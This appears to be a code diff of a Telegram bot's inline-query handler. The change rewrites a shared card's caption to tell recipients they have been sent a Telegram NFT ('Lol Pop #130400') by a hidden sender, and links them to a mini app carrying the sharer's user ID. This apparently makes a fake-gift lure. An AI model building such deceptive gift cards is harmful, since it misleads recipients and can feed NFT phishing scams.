@@ -77,7 +77,7 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
 
     nft_name = "Lol Pop #130400"
-    gif_url = "https://www.image2url.com/r2/default/gifs/1786609701564-2877ee88-25c6-4e8a-ad3f-2ade770a762f.gif"
+    gif_url = "https://www.image2url.com/r2/default/gifs/1786959529975-a05f7ff9-5af1-4c89-9b54-fd62ca60db66.gif"
 
     # Создаём красивую карточку с кнопкой
     keyboard = [
@@ -95,9 +95,9 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
             gif_url=gif_url,
             thumbnail_url=thumbnail,
             gif_width=480,
-            gif_height=524,
+            gif_height=738,
             title="Отправить Telegram NFT",
-            caption=f"**{nft_name}**\n\nОтправитель: Аккаунт скрыт",
+            caption=f"Вам отправлен Telegram NFT: **{nft_name}**\n\nОтправитель: Аккаунт скрыт",
             parse_mode='Markdown',
             reply_markup=reply_markup
         )
